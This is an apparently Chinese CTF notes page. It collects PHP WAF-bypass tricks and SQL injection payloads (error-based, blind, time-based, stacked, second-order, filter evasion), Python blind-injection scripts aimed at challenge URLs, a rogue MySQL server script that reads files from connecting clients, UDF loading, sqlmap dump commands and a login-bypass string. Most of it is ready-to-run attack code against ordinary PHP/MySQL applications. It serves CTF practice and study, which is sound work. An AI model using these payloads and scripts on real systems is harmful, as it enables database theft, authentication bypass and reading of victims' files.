<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str = <span class="string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span>;</span><br><span class="line"></span><br><span class="line">	parse_str($str, $output);</span><br><span class="line">	<span class="keyword">echo</span> $output[<span class="string">'first'</span>]; <span class="comment">//value</span></span><br><span class="line">	<span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">	<span class="keyword">echo</span> $output[<span class="string">'arr'</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line">	parse_str($str);</span><br><span class="line">	<span class="keyword">echo</span> $first; <span class="comment">// value</span></span><br><span class="line">	<span class="keyword">echo</span> $arr[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line">	<span class="keyword">echo</span> $arr[<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure>

<h2 id="php变量名解析绕过waf"><a href="#php变量名解析绕过waf" class="headerlink" title="php变量名解析绕过waf"></a>php变量名解析绕过waf</h2><p><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>
<p>?+num=phpinfo();</p>
<h2 id="php-进制转换来绕过waf"><a href="#php-进制转换来绕过waf" class="headerlink" title="php 进制转换来绕过waf"></a>php 进制转换来绕过waf</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 扫描目录</span><br><span class="line">hexdec(bin2hex(&apos;/&apos;));</span><br><span class="line">?+num=scandir(hex2bin(dechex(47))) #解码出来的会自动带上引号</span><br><span class="line"></span><br><span class="line">hexdec(bin2hex(&apos;/f1agg&apos;)); -&gt; 52115961636711</span><br><span class="line">?+num=file_get_contents(hex2bin(dechex(52115961636711)))</span><br></pre></td></tr></table></figure>

<h2 id="session-常用路径"><a href="#session-常用路径" class="headerlink" title="session 常用路径"></a>session 常用路径</h2><ul>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ul>
<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><h2 id="fuzz-payload"><a href="#fuzz-payload" class="headerlink" title="fuzz payload"></a>fuzz payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;|1|&apos;1</span><br></pre></td></tr></table></figure>

<h2 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue 报错注入"></a>extractvalue 报错注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema regexp <span class="keyword">database</span>()))) <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>

<h2 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml  报错注入"></a>updatexml  报错注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml(1,(select mid(concat(1,group_concat(flag)),1,64) from ctf.flag),1)%23</span><br></pre></td></tr></table></figure>

<h2 id="exp数值溢出报错注入"><a href="#exp数值溢出报错注入" class="headerlink" title="exp数值溢出报错注入"></a>exp数值溢出报错注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">password=1' or (exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema regexp <span class="keyword">database</span>())a))) <span class="keyword">or</span> <span class="string">'</span></span><br></pre></td></tr></table></figure>

<h2 id="pow数值溢出报错注入"><a href="#pow数值溢出报错注入" class="headerlink" title="pow数值溢出报错注入"></a>pow数值溢出报错注入</h2><p>脚本示例(题目中substr和mid都被过滤了, 因此采用reverse和left组合的手法):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://1.1.3.100/'</span></span><br><span class="line"><span class="comment">#  uname = "1'or((if(0,1,pow(left(reverse(left(password,&#123;0&#125;)),1)='&#123;1&#125;',22222222222222222222222222))))or'0"</span></span><br><span class="line"><span class="comment">#  uname = "1'or((if(0,1,pow(left(reverse(left(passwd,&#123;0&#125;)),1)='&#123;1&#125;',22222222222222222222222222))))or'0"</span></span><br><span class="line">uname = <span class="string">"1'or((if(0,1,pow(left(reverse(left(pwd,&#123;0&#125;)),1)='&#123;1&#125;',22222222222222222222222222))))or'0"</span></span><br><span class="line">pwd = <span class="string">'1'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.letters:</span><br><span class="line">        uname_tmp = uname.format(i,j)</span><br><span class="line">        data = &#123;</span><br><span class="line">                <span class="string">"uname"</span>:uname_tmp,</span><br><span class="line">                <span class="string">"pwd"</span>:pwd</span><br><span class="line">                &#125;</span><br><span class="line">        res = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="数值注入"><a href="#数值注入" class="headerlink" title="数值注入"></a>数值注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'1'</span>+(<span class="keyword">select</span> <span class="keyword">conv</span>(<span class="keyword">substr</span>(<span class="keyword">hex</span>((<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">2</span>,<span class="number">1</span>),<span class="number">16</span>,<span class="number">10</span>))+<span class="string">'1'</span>;</span><br><span class="line"><span class="comment"># 注意select database() 外面还要套一层括号不然报错</span></span><br><span class="line">或者</span><br><span class="line"> <span class="keyword">select</span> <span class="string">'1'</span>+(<span class="keyword">select</span> <span class="keyword">conv</span>(<span class="keyword">substr</span>(<span class="keyword">hex</span>(<span class="keyword">database</span>()),<span class="number">2</span>,<span class="number">1</span>),<span class="number">16</span>,<span class="number">10</span>))+<span class="string">'1'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="md5注入"><a href="#md5注入" class="headerlink" title="md5注入"></a>md5注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;ffifdyop&apos;这个东西在md5之后的值的开头为 &apos;or&apos;&lt;trash&gt; 可以有效绕过一些东西</span><br></pre></td></tr></table></figure>

<h2 id="like盲注"><a href="#like盲注" class="headerlink" title="like盲注"></a>like盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">username = &quot;admin&apos; or database() like &apos;&#123;0&#125;%&apos; #&quot;</span><br></pre></td></tr></table></figure>

<h2 id="二分盲注"><a href="#二分盲注" class="headerlink" title="二分盲注"></a>二分盲注</h2><p>2018xmas 的一道基于useragent的二分盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">_URL_=<span class="string">'xxxxxxxxxx'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResponse</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup     = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">    response = soup.findAll(<span class="string">'p'</span>)[<span class="number">3</span>].getText()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">'Welcome!'</span> <span class="keyword">in</span> response <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BindSQLinjection</span><span class="params">(column,table)</span>:</span></span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        l_bound = <span class="number">0</span>;u_bound = <span class="number">255</span></span><br><span class="line">        <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">            m_bound =(l_bound+u_bound)/<span class="number">2</span></span><br><span class="line">            header  =&#123;<span class="string">'User-Agent'</span>:<span class="string">"' or (selct ascii(substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;)-- ="</span>\</span><br><span class="line">                .format(column,table,pos,m_bound)&#125;</span><br><span class="line">            res     = requests.get(_URL_, headers=header)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> getResponse(res.text):</span><br><span class="line">                l_bound = m_bound + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                u_bound = m_bound - <span class="number">1</span></span><br><span class="line">                temp = m_bound</span><br><span class="line"></span><br><span class="line">        <span class="comment"># do not know what this segment mean:</span></span><br><span class="line">        <span class="comment"># if u_bound == 0:</span></span><br><span class="line">        <span class="comment">#   break</span></span><br><span class="line">            </span><br><span class="line">        flag += chr(temp)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'FLAG:%s'</span> % (flag) </span><br><span class="line">        <span class="keyword">while</span> <span class="string">'&#125;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    a = time.time()</span><br><span class="line">    BindSQLinjection(column,table)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Time used:'</span>,time.time() - a</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>setmefree</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</span><br><span class="line"><span class="keyword">import</span> sys, math</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(query)</span>:</span></span><br><span class="line"> </span><br><span class="line">    data = parse.urlencode(&#123; <span class="string">'username'</span> : <span class="string">"') and if((%s),1,0) #"</span> % query &#125;).encode()</span><br><span class="line">    <span class="comment">#我那个时候的想法是-1') union select 1,(时间盲注语句),1; # 应该反思，明明可以用跟快捷的方法的</span></span><br><span class="line"></span><br><span class="line">    req = request.Request(<span class="string">'http://3.16.68.122/smf/register.php'</span>, data = data)</span><br><span class="line">    req.get_method = <span class="keyword">lambda</span> : <span class="string">'POST'</span></span><br><span class="line">    res = request.urlopen(req).read().decode()</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> res.find(<span class="string">'User Not Registered'</span>) != <span class="number">-1</span>; <span class="comment"># means true</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greater_than_or_equal</span><span class="params">(query, i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send(<span class="string">'%s &gt;= %d'</span> % (query, i));</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">equal</span><span class="params">(query, i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send(<span class="string">'%s = %d'</span> % (query, i));</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(query)</span>:</span></span><br><span class="line">    min_val = <span class="number">0</span></span><br><span class="line">    max_val = <span class="number">128</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">while</span> min_val + <span class="number">1</span> &lt; max_val:</span><br><span class="line">        mid = math.floor((min_val + max_val) / <span class="number">2</span>)</span><br><span class="line">        <span class="comment">#这是何苦呢，本来除法就是向下取整的。不过秀还是很秀的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> greater_than_or_equal(query, mid):</span><br><span class="line">            min_val = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_val = mid</span><br><span class="line">            <span class="comment">#这是ascii码大于等于都不成立的情况，也就是说mid不可能是正确结果，看起来好像是将正确结果逼向min_val</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> equal(query, min_val):</span><br><span class="line">        <span class="keyword">return</span> search(query)</span><br><span class="line">        <span class="comment">#如果找不到就再找一次</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> min_val</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(query)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> search(<span class="string">'length((%s))'</span> % query)</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_and_print_content</span><span class="params">(query, length)</span>:</span></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        content += chr(search(<span class="string">'ord(substr((%s), %d, 1))'</span> % (query, i + <span class="number">1</span>)))</span><br><span class="line">        sys.stdout.write(<span class="string">'\r[%s] %s%s'</span> % (length, content, <span class="string">'_'</span> * (length - len(content))))</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    arg = <span class="string">' '</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line">     </span><br><span class="line">    content_len = get_length(arg)</span><br><span class="line">    get_and_print_content(arg, content_len)</span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests </span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &apos;http://192.168.0.117/sqli-labs/Less-10/?id=1&quot; and if(&#123;&#125;,sleep(3),1)--+%20=&apos;</span><br><span class="line"></span><br><span class="line">sql1 = &quot;(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %s for 1)=&apos;%s&apos;)&quot;</span><br><span class="line"></span><br><span class="line">sql2 = &quot;(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;) from %s for 1)=&apos;%s&apos;)&quot;</span><br><span class="line"></span><br><span class="line">sql2 = &quot;(substr((select group_concat(username,password) from users) from %s for 1)=&apos;%s&apos;)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,60):</span><br><span class="line">    for j in string.printable:</span><br><span class="line">        sql1_tmp = sql2 % (i,j)</span><br><span class="line">        url_tmp = url.format(sql1_tmp)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            res = requests.get(url_tmp,timeout=2)</span><br><span class="line"></span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            result += j</span><br><span class="line">            print result</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print result</span><br></pre></td></tr></table></figure>

<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>常见于带有评论功能的网站, 数据库字段一般有这几种</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59270591-6c2d7180-8c84-11e9-9795-44deeaa6d97c.png" alt="image"></p>
<p>二次注入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title=aaa&amp;content=111&apos;,&apos;aaa&apos;),(&apos;2515&apos;,(select group_concat(password) from users),&apos;222</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540" target="_blank" rel="noopener">n1ctf的经典题目</a></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><img src="https://user-images.githubusercontent.com/40637063/58421301-2e481f00-80c2-11e9-9c91-2921b0705207.png" alt="image"></p>
<p>过滤了<code>select</code>，十分符合实际情况。</p>
<p>payload：(之前通过盲注打出来数据库名supersqli但是没啥用)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;;show tables;#</span><br><span class="line"></span><br><span class="line">&apos;;show columns from `1919810931114514`;#</span><br><span class="line"></span><br><span class="line">&apos;;use supersqli;set @sql=concat(&apos;sel&apos;,&apos;ect flag from `1919810931114514`;&apos;);PREPARE kkk from @sql;execute kkk;#</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意，PREPARE 必须要大写，不知道为什么，但是复现的时候换成小写就是不行的，还是保险起见。</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/40637063/58421167-e0cbb200-80c1-11e9-8acf-ac2d5070ccc1.png" alt="image"></p>
<p>关于这道题, 另一种解法是将替换表名, 将flag所在的表的名字替换成我们现在所使用 的表的名字.</p>
<p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>例如sql语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$link = mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">$table = addslashes($_GET[&apos;table&apos;]);</span><br><span class="line">$sql=&quot;UPDATE `&#123;$table&#125;`</span><br><span class="line">	SET `username`=&apos;admin&apos;</span><br><span class="line">	WHERE id=1&quot;;</span><br><span class="line">mysqli_query($linke,$sql);</span><br></pre></td></tr></table></figure>

<p>由于sql查询语句是分行的, 因此这里无法使用注释符来注释掉后面的内容. 只能从update关键字来入手.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update `table` t left join (select &apos;1&apos; as user from dual)tt on tt.user=t.username set username=&apos;admin&apos; where id=1;</span><br></pre></td></tr></table></figure>

<p><strong>dual是mysql中的虚表, update不允许leftjoin相同的表, 但是只知道一张表, 那么就可以选择使用虚表</strong>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update `table` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username`</span><br><span class="line"> set username =&apos;admin&apos; </span><br><span class="line">where id=1;</span><br></pre></td></tr></table></figure>

<p>引号被过滤的时候可以使用char编码来替代</p>
<h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users (id,username,password) values(1,&apos;admin&apos;,&apos;admin&apos;);</span><br><span class="line">insert users set id=1,username=&apos;admin&apos;,password=&apos;admin&apos;;</span><br></pre></td></tr></table></figure>

<h2 id="读取外部文件"><a href="#读取外部文件" class="headerlink" title="读取外部文件"></a>读取外部文件</h2><p>将/etc/passwd文件信息读取到test表里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &apos;\n&apos;;</span><br></pre></td></tr></table></figure>

<p>(会被secure-file-priv限制)</p>
<h2 id="当空格被过滤的时候"><a href="#当空格被过滤的时候" class="headerlink" title="当空格被过滤的时候"></a>当空格被过滤的时候</h2><ul>
<li>制表符/t来替代, 像这样</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/61511718-2e153180-aa2a-11e9-8051-d0e55b9f5a78.png" alt="1562497941427"></p>
<p>在python中发送包含制表符的数据包, 需要类似于这<code>((substr((select\tflag\tfrom\tflag),{0},1))=&#39;{1}&#39;)</code></p>
<ul>
<li>使用括号来分隔关键字</li>
</ul>
<h3 id="from-被过滤了-mysql-管道符"><a href="#from-被过滤了-mysql-管道符" class="headerlink" title="from 被过滤了(mysql 管道符)"></a>from 被过滤了(mysql 管道符)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$BlackList =&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br></pre></td></tr></table></figure>

<p>查询语句是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>

<h2 id="substr-mid-被过滤了"><a href="#substr-mid-被过滤了" class="headerlink" title="substr mid 被过滤了"></a>substr mid 被过滤了</h2><p>reverse 和 left 组合拳</p>
<h2 id="等号-被过滤了"><a href="#等号-被过滤了" class="headerlink" title="等号(=) 被过滤了"></a>等号(=) 被过滤了</h2><p>使用regexp来替代, 在exp数值溢出那处有示例</p>
<h2 id="information-schema被过滤"><a href="#information-schema被过滤" class="headerlink" title="information_schema被过滤"></a>information_schema被过滤</h2><p>mysql 5.6.X起，新增了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两个表.</p>
<p>其中<code>innodb_index_stats</code>存储的是innodb引擎的库名,表名及其对应的索引名称.<code>innodb_table_stats</code>存储的是innodb引擎的库名和表名,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</span><br></pre></td></tr></table></figure>

<h2 id="mysql客户端服务端字符编码不统一造成的漏洞"><a href="#mysql客户端服务端字符编码不统一造成的漏洞" class="headerlink" title="mysql客户端服务端字符编码不统一造成的漏洞"></a>mysql客户端服务端字符编码不统一造成的漏洞</h2><p><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
<p>当客户端和mysql连接的编码是utf8而服务端密码是latin1(默认是latin1)的时候</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin%2c%2c</span><br></pre></td></tr></table></figure>

<p><strong>Mysql在转换字符集的时候，将不完整的字符给忽略了</strong>。在服务端会忽略掉结尾的%2c%2c,这个时候</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin%2c%2c=admin</span><br></pre></td></tr></table></figure>

<h2 id="mysql-客户端攻击-被攻击的是客户端"><a href="#mysql-客户端攻击-被攻击的是客户端" class="headerlink" title="mysql 客户端攻击(被攻击的是客户端)"></a>mysql 客户端攻击(被攻击的是客户端)</h2><p>和读取外部文件不同, 这里多了一个local, 意思是从客户端本地的/etc/passwd文件中向服务端的test表格中插入. 这种方法不受 secure-file-priv限制, 而且大部分mysql都是默认开启的.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &apos;\n&apos;;</span><br></pre></td></tr></table></figure>

<p>对客户端攻击的流程如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端: 我要把/etc/passwd发给你</span><br><span class="line">服务端响应: 好的, 你把/root/flag给我吧</span><br><span class="line">客户端听从服务端的响应, 发送/root/flag给服务端,服务端完成对客户端的任意文件读取.</span><br></pre></td></tr></table></figure>

<p>服务端脚本:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/etc/passwd"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3308</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<h2 id="一些零碎的知识"><a href="#一些零碎的知识" class="headerlink" title="一些零碎的知识"></a>一些零碎的知识</h2><ul>
<li><p>如果目标关键字里面包含mysql中的关键字比如<code>@</code> , 那么这个字段要被反引号<code>`</code> 而不能是单引号和双引号所包含.</p>
</li>
<li><p>表中列的名字未知的时候可以替换列名</p>
</li>
<li><p>![89`OH2TEW3KHJK4ZK@}HDI8](<a href="https://user-images.githubusercontent.com/40637063/59104692-c963b300-8964-11e9-91e0-38c7084f65b6.png" target="_blank" rel="noopener">https://user-images.githubusercontent.com/40637063/59104692-c963b300-8964-11e9-91e0-38c7084f65b6.png</a>)</p>
</li>
<li><p>也可以这样子,数字后面的反引号字母相当于as</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(a) from (select 1,2`a`,3,4,5 union select * from yunzhi_teacher)b;</span><br></pre></td></tr></table></figure>
</li>
<li><p><img src="https://user-images.githubusercontent.com/40637063/64146336-1dd8da80-ce4f-11e9-8c41-a7218e77fc55.png" alt="QQ截图20190903133029"></p>
</li>
<li><p>还可以这样子</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from (select 1)a,(select 2)b,(select 3)c union select * from users;</span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">不知道列名的情况payload = &quot;(select case when ((SELECT t.4 from (select * from((select 1)a join(select 2)b join (select 3)c join (select 4)d) union/**/select * from flag) as t limit 1 offset 1) like &apos;flag&#123;__________&apos;) then sleep(2) else 0 end)&quot;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>从so文件中导入函数并执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Linux下的.so是基于Linux下的动态链接,其功能和作用类似与windows下.dll文件。 通常情况下，对函数库的链接是放在编译时期（compile time）完成的。</span><br><span class="line">#导入so文件并创建其中的函数</span><br><span class="line">create function help_me returns string soname &quot;udf.so.dhfiavloihdislvnaflbve32874349&quot;;</span><br><span class="line">select help_me();</span><br><span class="line">#调用函数</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap使用小结"><a href="#sqlmap使用小结" class="headerlink" title="sqlmap使用小结"></a>sqlmap使用小结</h2><p>在burpsuite中抓包之后将其保存, 参数 <code>-p</code> 表示注入点的名字.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sqlmap -r"the path of packagefile" -p admin_name --dbs</span><br><span class="line">sudo sqlmap -r"the path of packagefile" -D bugkusql1 -p admin_name --tables</span><br><span class="line">sudo sqlmap -r"the path of packagefile" -D bugkusql1 -T flag1 -p admin_name --columns</span><br><span class="line">sudo sqlmap -r"the path of packagefile" -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump</span><br></pre></td></tr></table></figure>

<p>post方式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sqlmap -u http://xxxxx/a.php --data="id=1"</span><br></pre></td></tr></table></figure>

<p>不抓包直接注入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sqlmap -u http://xxxxxxx/a.php?name=1 --dbs</span><br><span class="line">sudo sqlmap -u http://xxxxxxx/a.php?name=1 -D ctf --tables</span><br><span class="line">sudo sqlmap -u http://xxxxxxxx/a.php?name=1 -D ctf -T user --columns</span><br><span class="line">sudo sqlmap -u http://xxxxxxxx/a.php?name=1 -D ctf -T user -C username --dump</span><br></pre></td></tr></table></figure>

<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>让用户名和密码等于这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;=&apos;</span><br></pre></td></tr></table></figure>

